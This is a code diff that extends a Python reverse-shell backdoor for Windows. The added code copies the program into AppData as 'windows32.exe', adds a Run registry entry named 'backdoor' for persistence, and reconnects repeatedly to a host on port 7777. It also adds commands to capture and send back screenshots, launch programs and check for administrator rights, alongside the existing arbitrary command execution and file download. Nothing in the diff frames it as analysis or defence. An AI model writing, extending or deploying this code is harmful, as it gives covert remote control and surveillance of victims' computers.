@@ -6,6 +6,38 @@ import os
 import subprocess
 import base64
 import requests
+import mss
+import time
+import shutil
+import sys
+
+def createPersistence():
+    location = os.environ['appdata'] + '\\windows32.exe'
+    if not os.path.exists(location):
+        shutil.copyfile(sys.executable, location)
+        subprocess.call('reg add HKCU\Software\Microsoft\Windows\Current\Version\Run /v backdoor /t REG_SZ /d "' + location + '"', shell=True)    
+
+def adminCheck():
+    global admin 
+    try:
+        check = os.listdir(os.sep.join([os.environ.get("SystemRoot",'C:\windows'),'temp']))
+    except:
+        admin = "Error, you don't have privileges"
+    else:
+        admin = "Revised administrator privileges"
+
+def connection():
+    while True:
+        time.sleep(5)
+        try:
+            host.connect(('192.168.0.2',7777))
+            shell()
+        except:
+            connection()
+
+def screenShot():
+    screen = mss.mss()
+    screen.shot() 
 
 def downloadFile(url):
     consulta = requests.get(url)
@@ -36,7 +68,27 @@ def shell():
                 downloadFile(res[4:])
                 host.send("File downloaded succesfully")
             except:
-                host.send("Download error has ocurred...")   
+                host.send("Download error has ocurred...")  
+        elif res[:10] == "screenshot":
+            try:
+                screenShot()
+                with open('monitor-1.png','rb') as file_send:
+                    host.send(base64.b64encode(file_send.read()))
+                os.remove("monitor-1.png")
+            except:
+                host.send(base64.b64encode("fail")) 
+        elif res[:5] == "start":
+            try:
+                subprocess.Popen(res[6:],shell=True)
+                host.send("The program started succesfully")
+            except:
+                host.send("The program couldn't be started")
+        elif res[:5] == "check":
+            try:
+                adminCheck()
+                host.send(admin)
+            except:
+                host.send("Task failed")
         else:
             proc=subprocess.Popen(res,shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin=subprocess.PIPE)
             result = proc.stdout.read() + proc.stderr.read()
@@ -45,8 +97,8 @@ def shell():
             else:
                 host.send(result)
 
+createPersistence()
 host = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-host.connect(('192.168.0.8',7777))
-shell()
+connection()
 host.close()
 
